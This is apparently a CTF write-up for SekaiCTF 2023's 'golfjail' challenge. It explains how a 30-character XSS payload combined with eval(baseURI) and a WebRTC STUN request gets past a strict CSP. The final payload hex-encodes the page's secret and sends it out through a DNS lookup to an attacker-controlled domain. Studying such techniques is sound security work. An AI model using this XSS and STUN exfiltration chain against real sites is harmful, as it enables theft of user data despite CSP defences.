## Desc
I hope you like golfing ⛳🏌️⛳🏌️ Admin Bot ❖ Note The admin bot only takes URLs of the format /^ [https://golfjail.chals.sekai.team//](https://golfjail.chals.sekai.team//)

This chall from SekaiCTF '23, by Strellic - and you know it's a good challenge when Strellic's the author

![[Pasted image 20261106134453.png]]

The source code we're given is just that, but solving it isn't that easy. Let's start by mapping out the policy

CSP :
- `default-src 'none'` means this page can't tell the browser to make HTTP requests for any resource, same-origin or cross-origin. So img src, fetch, stylesheets, etc are all blocked.
- `frame-ancestors 'none'`  means this page can't be loaded inside another page's iframe, same-origin or not.
- `script-src 'unsafe-inline'` means inline JS / event handlers allowed. 
- `script-src 'unsafe-eval'` means  compiling a string into code at runtime allowed (using eval() etc )

COOP :
- `same origin` means only allows a **same-origin** opener/openee relationship

![[Pasted image 20261106145542.png]]

The HTML renders an iframe. It's sandboxed, so we can't reach outside of it no popups, no reading the parent's DOM, etc. But it has `allow-scripts`, so we can still run JS inside. 
Our objective, the flag, sits in there as a comment, and our injected payload lands in there too and if that payload contains valid JS, it'll execute right here

![[Pasted image 20261106152311.png]]

Now let's look at where and how our payload gets pulled in. It's pretty simple to read, but also kind of annoying because it just grabs our payload straight from a URL query param `xss`, but it's capped at 30 characters.
## Bypass 30 chars

we gonna use payload below

``` python
<svg onload=eval('`',baseURI)>
```

Why we using `svg onload` and not `img onerror` or `<script>`? let's see trace below

``` python
<svg onload=eval('`',baseuri)> , len = 30 fits exactly
<script>eval('`',baseuri)</script> , len  = 34 
<img src=x onerror=eval('`',baseuri)> , len = 37
```
### Then what does `baseURI` do?
Basically it pulls everything from our URL. That's how we bypass the 30-char cap: we can dump a bunch of payload straight into the URL, and it all comes through once eval resolves `baseURI`.

here's the example

![[Pasted image 20261106224751.png]]

Note: what the backtick is for covered later
## Bypass default-src 'none'

Remember, the page has CSP `default-src 'none'` in the header, which means we can't just tell the browser to make HTTP requests, even same-origin ones.

So how do we bypass it? We'll use WebRTC.

What is WebRTC? To put it simply, if you’ve ever used Google Meet directly in your browser without installing an app, WebRTC is the technology that connects the users to each other.

Now, there's a networking issue when trying to connect User A and User B: the browser usually only knows its private IP. But to connect across different networks, we actually need the public IP.

So the first thing WebRTC does is grab that public IP using a STUN server. You can think of the STUN server like a mirror. Your packet starts with your private IP, passes through your router, gets stamped with your router's public IP via NAT, and reaches the STUN server. The STUN server then reflects that public IP back to you, which is how the client figures out its own public IP.

`The peer exchange part is kept simple here since we don't need to go too deep into the protocol for this challenge`
### webRTC in a Nutshell

``` javascript
var pc = new RTCPeerConnection({
  iceServers: [
    { urls: "stun:stun.example.com:3478" }
  ]
});

pc.createOffer({ offerToReceiveAudio: 1 })
  .then(function(R) {
    pc.setLocalDescription(R);
  });
```

Explanation:

- `new RTCPeerConnection()` creates the WebRTC connection object. This is basically the first preparation step.
- `iceServers` tells the browser which STUN server to use. Think of it like: “This is the STUN server we can ask about our reachable/public address.”
- `createOffer({ offerToReceiveAudio: 1 })` creates an SDP offer  basically a local proposal describing what kind of media you want. The `offerToReceiveAudio: 1` part tells it you want to receive audio. There are other options too, like `offerToReceiveVideo`
- `.then(offer => ...)` handles the result from `createOffer()`, since it returns a Promise.
- `setLocalDescription(offer)` applies the offer to the connection. This is the part that starts the real ICE gathering process, which can trigger the STUN request.

Now we roughly know what WebRTC does at the start of a connection.

The part we actually leverage for the bypass is the **STUN request**. CSP (`default-src 'none'`) only polices HTTP requests : fetch, XHR, WebSocket, etc. But a STUN request isn't HTTP. It's its own protocol (STUN) carried over raw **UDP**, not HTTP. Because it's just UDP traffic from the browser's WebRTC we can bypass the CSP (def-src 'none').

**Note:** The server we set up to catch this traffic can't sit behind Cloudflare (or any similar HTTP CDN/proxy). STUN speaks raw UDP, and Cloudflare's proxy only fronts HTTP/HTTPS it won't forward UDP STUN packets to your origin. So the receiver has to be a raw server/VPS with a public IP and the UDP port open.

## Final Payload - *Shoutout to **strellic** for this payload technique!

``` python
https://golfjail.chals.sekai.team/?a=`;/*&xss=%3Csvg%20onload=eval(%27`%27%2BbaseURI)%3E&b=*/pc=new/**/RTCPeerConnection({[`iceServers`]:[{[`urls`]:[`stun:${document.childNodes[0].textContent.split(``).map(function(c){return/**/c.charCodeAt(0).toString(16)}).join(``).slice(0,32)}.gokong.com`]}]});pc.createOffer({offerToReceiveAudio:1}).then(function(R){pc.setLocalDescription(R)});
```

> [!note]- Why hex-encode the flag for the STUN request?
> Because we are exfiltrating the flag via a DNS request (the STUN server URL). According to DNS rules, subdomains can **only** contain alphanumeric characters (`a-z`, `A-Z`, `0-9`) and hyphens (`-`).
> 
> A standard CTF flag looks like `SEKAI{...}`. If you try to make a DNS request to `SEKAI{...}.gokong.com`, it will fail because `{` and `}` are invalid DNS characters.
> 
> To bypass this, the payload grabs the flag (`document.childNodes[0].textContent`), splits it into characters, and converts each one into its ASCII Hex equivalent (e.g., `{` becomes `7b`). It joins them back together and slices the first 32 characters (to respect DNS label length limits).
> 
> Now, the final URL becomes something like `stun:53454b41...gokong.com`. Since it's pure hex, it's a perfectly valid DNS request, and you can easily decode it back on your VPS!

> [!note]- What are `/*`, `?a`, and `&b` doing?
> You can trace it yourself, but basically:
> - **`?a`** provides the backtick to close the initial string and **starts** a JS block comment (`/*`). This comments out the messy XSS/HTML tags in the middle of the URL so they don't cause Syntax Errors.
> - **`&b`** **closes** the block comment (`*/`). This frees up the rest of the URL, allowing our actual WebRTC payload to execute safely as valid JS.
>